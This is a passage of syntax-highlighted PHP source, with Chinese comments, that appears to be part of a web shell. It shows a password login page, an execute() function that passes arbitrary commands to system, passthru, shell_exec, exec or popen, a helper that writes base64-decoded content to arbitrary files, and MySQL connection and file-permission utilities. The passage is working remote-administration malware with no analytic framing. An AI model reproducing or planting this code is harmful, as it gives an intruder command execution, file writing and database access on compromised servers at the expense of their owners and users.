<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">multipage</span> = ($<span style="color: #ffeead;">curpage</span> - $<span style="color: #ffeead;">offset</span> <span style="color: #bbdaff;">&gt;</span> <span style="color: #ffffff; background-color: #002451;">1</span> &amp;&amp; $<span style="color: #ffeead;">pages</span> &gt; $<span style="color: #ffeead;">page</span> ? <span style="color: #99ffff;">'&lt;a href="javas</span><span style="color: #99ffff; text-decoration: underline;">cript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \'\', 1);"&gt;First&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #ffeead; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> &gt; </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;"> ? </span><span style="color: #99ffff; text-decoration: underline;">'&lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #ffeead; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> - </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">');"&gt;Prev&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">for</span>($<span style="color: #ffeead;">i</span> = $<span style="color: #ffeead;">from</span>; $<span style="color: #ffeead;">i</span> &lt;= $<span style="color: #ffeead;">to</span>; $<span style="color: #ffeead;">i</span>++) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">multipage</span> .= $<span style="color: #ffeead;">i</span> == $<span style="color: #ffeead;">curpage</span> ? $<span style="color: #ffeead;">i</span>.<span style="color: #99ffff;">' '</span> : <span style="color: #99ffff;">'&lt;a href="javascript:settabl</span><span style="color: #99ffff; text-decoration: underline;">e(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">');"&gt;['</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">']&lt;/a&gt; '</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">multipage</span> .= ($<span style="color: #ffeead;">curpage</span> &lt; $<span style="color: #ffeead;">pages</span> ? <span style="color: #99ffff;">'&lt;a href="javascript:settable(\''</span>.$<span style="color: #ffeead;">ta</span><span style="color: #ffeead; text-decoration: underline;">blename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #ffeead; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> + </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">');"&gt;Next&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #ffeead; text-decoration: underline;">to</span><span style="text-decoration: underline;"> &lt; $</span><span style="color: #ffeead; text-decoration: underline;">pages</span><span style="text-decoration: underline;"> ? </span><span style="color: #99ffff; text-decoration: underline;">' &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">pages</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">');"&gt;Last&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">multipage</span> = $<span style="color: #ffeead;">multipage</span> ? <span style="color: #99ffff;">'&lt;p&gt;Pages: '</span>.$<span style="color: #ffeead;">multipage</span>.<span style="color: #99ffff;">'&lt;/p&gt;'</span> : <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">multipage</span>;
}
<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#30331;&#38470;&#20837;&#21475;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">loginpage</span>() {
<span style="color: #ebbbff;">?&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;style</span> <span style="color: #bbdaff;">type=</span><span style="color: #99ffff;">"text/css"</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ff9da4; font-weight: bold;">input</span> {<span style="color: #ff9da4; font-weight: bold;">font</span>:<span style="color: #ffffff; background-color: #002451;">11</span>px <span style="color: #ff9da4; font-weight: bold;">Verdana</span>;<span style="color: #ff9da4; font-weight: bold;">BACKGROUND</span>: <span style="color: #7285b7; font-style: italic;">#FFFFFF;height: 18px;border: 1px solid </span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">#666666;}</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/style&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;form</span> <span style="color: #bbdaff;">method=</span><span style="color: #99ffff;">"POST"</span> <span style="color: #bbdaff;">action=</span><span style="color: #99ffff;">""</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;span</span> <span style="color: #bbdaff;">style=</span><span style="color: #99ffff;">"font:11px Verdana;"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">Password</span>: <span style="color: #bbdaff;">&lt;/span&gt;&lt;input</span> <span style="color: #bbdaff;">name=</span><span style="color: #99ffff;">"password"</span> <span style="color: #bbdaff;">typ</span><span style="color: #bbdaff; text-decoration: underline;">e=</span><span style="color: #99ffff; text-decoration: underline;">"password"</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">size=</span><span style="color: #99ffff; text-decoration: underline;">"20"</span><span style="color: #bbdaff; text-decoration: underline;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;input</span> <span style="color: #bbdaff;">type=</span><span style="color: #99ffff;">"hidden"</span> <span style="color: #bbdaff;">name=</span><span style="color: #99ffff;">"action"</span> <span style="color: #bbdaff;">value=</span><span style="color: #99ffff;">"login"</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;input</span> <span style="color: #bbdaff;">type=</span><span style="color: #99ffff;">"submit"</span> <span style="color: #bbdaff;">value=</span><span style="color: #99ffff;">"Login"</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/form&gt;</span>
<span style="color: #ebbbff;">&lt;?php</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">exit</span>;
}<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">end loginpage()</span>

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">execute</span>($<span style="color: #ffeead;">cfe</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">cfe</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'system'</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">ob_start(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">system(</span>$<span style="color: #ffeead;">cfe</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = @<span style="color: #ffffff; background-color: #002451;">ob_get_contents(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">ob_end_clean(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span>(<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'passthru'</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">ob_start(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">passthru(</span>$<span style="color: #ffeead;">cfe</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = @<span style="color: #ffffff; background-color: #002451;">ob_get_contents(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">ob_end_clean(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span>(<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'shell_exec'</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = @<span style="color: #ffffff; background-color: #002451;">shell_exec(</span>$<span style="color: #ffeead;">cfe</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span>(<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'exec'</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">exec(</span>$<span style="color: #ffeead;">cfe</span>,$<span style="color: #ffeead;">res</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = <span style="color: #ffffff; background-color: #002451;">join(</span><span style="color: #99ffff;">"\n"</span>,$<span style="color: #ffeead;">res</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span>(@<span style="color: #ffffff; background-color: #002451;">is_resource(</span>$<span style="color: #ffeead;">f</span> = @<span style="color: #ffffff; background-color: #002451;">popen(</span>$<span style="color: #ffeead;">cfe</span>,<span style="color: #99ffff;">"r"</span>))) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span>(!@<span style="color: #ffffff; background-color: #002451;">feof(</span>$<span style="color: #ffeead;">f</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> .= @<span style="color: #ffffff; background-color: #002451;">fread(</span>$<span style="color: #ffeead;">f</span>,<span style="color: #ffffff; background-color: #002451;">1024</span>);<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">pclose(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">res</span>;
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">which</span>($<span style="color: #ffeead;">pr</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">path</span> = <span style="color: #ffffff; background-color: #002451;">execute(</span><span style="color: #99ffff;">"which $pr"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> ($<span style="color: #ffeead;">path</span> ? $<span style="color: #ffeead;">path</span> : $<span style="color: #ffeead;">pr</span>);<span style="color: #ff9da4; background-color: #003f8e;"> </span>
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">cf</span>($<span style="color: #ffeead;">fname</span>,$<span style="color: #ffeead;">text</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">fp</span>=@<span style="color: #ffffff; background-color: #002451;">fopen(</span>$<span style="color: #ffeead;">fname</span>,<span style="color: #99ffff;">'w'</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">fputs(</span>$<span style="color: #ffeead;">fp</span>,@<span style="color: #ffffff; background-color: #002451;">base64_decode(</span>$<span style="color: #ffeead;">text</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">fp</span>);
<span style="background-color: #003f8e;"> </span>   }
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">dirsize</span>($<span style="color: #ffeead;">dir</span>) {<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dh</span> = @<span style="color: #ffffff; background-color: #002451;">opendir(</span>$<span style="color: #ffeead;">dir</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">size</span> = <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span>($<span style="color: #ffeead;">file</span> = @<span style="color: #ffffff; background-color: #002451;">readdir(</span>$<span style="color: #ffeead;">dh</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">file</span> != <span style="color: #99ffff;">'.'</span> &amp;&amp; $<span style="color: #ffeead;">file</span> != <span style="color: #99ffff;">'..'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">path</span> = $<span style="color: #ffeead;">dir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">size</span> += @<span style="color: #ffffff; background-color: #002451;">is_dir(</span>$<span style="color: #ffeead;">path</span>) ? <span style="color: #ffffff; background-color: #002451;">dirsize(</span>$<span style="color: #ffeead;">path</span>) : @<span style="color: #ffffff; background-color: #002451;">filesize(</span>$<span style="color: #ffeead;">path</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">closedir(</span>$<span style="color: #ffeead;">dh</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">size</span>;
}
<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#39029;&#38754;&#35843;&#35797;&#20449;&#24687;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">debuginfo</span>() {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">starttime</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mtime</span> = <span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">' '</span>, <span style="color: #ffffff; background-color: #002451;">microtime(</span>));
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">totaltime</span> = <span style="color: #ffffff; background-color: #002451;">number_format(</span>($<span style="color: #ffeead;">mtime</span>[<span style="color: #ffffff; background-color: #002451;">1</span>] + $<span style="color: #ffeead;">mtime</span>[<span style="color: #ffffff; background-color: #002451;">0</span>] - $<span style="color: #ffeead;">starttime</span>), <span style="color: #ffffff; background-color: #002451;">6</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> <span style="color: #99ffff;">'Processed in '</span>.$<span style="color: #ffeead;">totaltime</span>.<span style="color: #99ffff;">' second(s)'</span>;
}

<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">mydbconn</span>($<span style="color: #ffeead;">dbhost</span>,$<span style="color: #ffeead;">dbuser</span>,$<span style="color: #ffeead;">dbpass</span>,$<span style="color: #ffeead;">dbname</span>=<span style="color: #99ffff;">''</span>,$<span style="color: #ffeead;">charset</span>=<span style="color: #99ffff;">''</span>,$<span style="color: #ffeead;">dbport</span>=<span style="color: #99ffff;">'3306'</span>)<span style="text-decoration: underline;"> {</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">charsetdb</span>;
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">ini_set(</span><span style="color: #99ffff;">'mysql.connect_timeout'</span>, <span style="color: #ffffff; background-color: #002451;">5</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!$<span style="color: #ffeead;">link</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_connect(</span>$<span style="color: #ffeead;">dbhost</span>.<span style="color: #99ffff;">':'</span>.$<span style="color: #ffeead;">dbport</span>, $<span style="color: #ffeead;">dbuser</span>, $<span style="color: #ffeead;">dbpass</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">exit</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">link</span> &amp;&amp; $<span style="color: #ffeead;">dbname</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!@<span style="color: #ffffff; background-color: #002451;">mysql_select_db(</span>$<span style="color: #ffeead;">dbname</span>, $<span style="color: #ffeead;">link</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;Database selected has error&lt;/h2&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">exit</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">link</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">mysql_get_server_info(</span>) &gt; <span style="color: #99ffff;">'4.1'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">charset</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">in_array(strtolower(</span>$<span style="color: #ffeead;">charset</span>), $<span style="color: #ffeead;">charsetdb</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SET character_set_connection=$charset, character_set_results=$cha</span><span style="color: #99ffff; text-decoration: underline;">rset, character_set_client=binary;"</span><span style="text-decoration: underline;">, $</span><span style="color: #ffeead; text-decoration: underline;">link</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">link</span>;
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#21435;&#25481;&#36716;&#20041;&#23383;&#31526;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">s_array</span>(&amp;$<span style="color: #ffeead;">array</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">is_array(</span>$<span style="color: #ffeead;">array</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">array</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">k</span> =&gt; $<span style="color: #ffeead;">v</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">array</span>[$<span style="color: #ffeead;">k</span>] = <span style="color: #ffffff; background-color: #002451;">s_array(</span>$<span style="color: #ffeead;">v</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">is_string(</span>$<span style="color: #ffeead;">array</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">array</span> = <span style="color: #ffffff; background-color: #002451;">stripslashes(</span>$<span style="color: #ffeead;">array</span>);
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">array</span>;
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#28165;&#38500;HTML&#20195;&#30721;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">html_clean</span>($<span style="color: #ffeead;">content</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">content</span> = <span style="color: #ffffff; background-color: #002451;">htmlspecialchars(</span>$<span style="color: #ffeead;">content</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">content</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">"\n"</span>, <span style="color: #99ffff;">"&lt;br /&gt;"</span>, $<span style="color: #ffeead;">content</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">content</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">"  "</span>, <span style="color: #99ffff;">"&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #ffeead;">content</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">content</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">"\t"</span>, <span style="color: #99ffff;">"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #ffeead;">content</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">content</span>;
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#33719;&#21462;&#26435;&#38480;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getChmod</span>($<span style="color: #ffeead;">filepath</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ffffff; background-color: #002451;">substr(base_convert(</span>@<span style="color: #ffffff; background-color: #002451;">fileperms(</span>$<span style="color: #ffeead;">filepath</span>),<span style="color: #ffffff; background-color: #002451;">10</span>,<span style="color: #ffffff; background-color: #002451;">8</span>),-<span style="color: #ffffff; background-color: #002451;">4</span>);
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getPerms</span>($<span style="color: #ffeead;">filepath</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mode</span> = @<span style="color: #ffffff; background-color: #002451;">fileperms(</span>$<span style="color: #ffeead;">filepath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>xC000) === <span style="color: #ffffff; background-color: #002451;">0</span>xC000) {$<span style="color: #ffeead;">type</span> = <span style="color: #99ffff;">'s'</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> (($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>x4000) === <span style="color: #ffffff; background-color: #002451;">0</span>x4000) {$<span style="color: #ffeead;">type</span> = <span style="color: #99ffff;">'d'</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> (($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>xA000) === <span style="color: #ffffff; background-color: #002451;">0</span>xA000) {$<span style="color: #ffeead;">type</span> = <span style="color: #99ffff;">'l'</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> (($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>x8000) === <span style="color: #ffffff; background-color: #002451;">0</span>x8000) {$<span style="color: #ffeead;">type</span> = <span style="color: #99ffff;">'-'</span>;}<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> (($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>x6000) === <span style="color: #ffffff; background-color: #002451;">0</span>x6000) {$<span style="color: #ffeead;">type</span> = <span style="color: #99ffff;">'b'</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> (($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>x2000) === <span style="color: #ffffff; background-color: #002451;">0</span>x2000) {$<span style="color: #ffeead;">type</span> = <span style="color: #99ffff;">'c'</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> (($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>x1000) === <span style="color: #ffffff; background-color: #002451;">0</span>x1000) {$<span style="color: #ffeead;">type</span> = <span style="color: #99ffff;">'p'</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">else</span> {$<span style="color: #ffeead;">type</span> = <span style="color: #99ffff;">'?'</span>;}

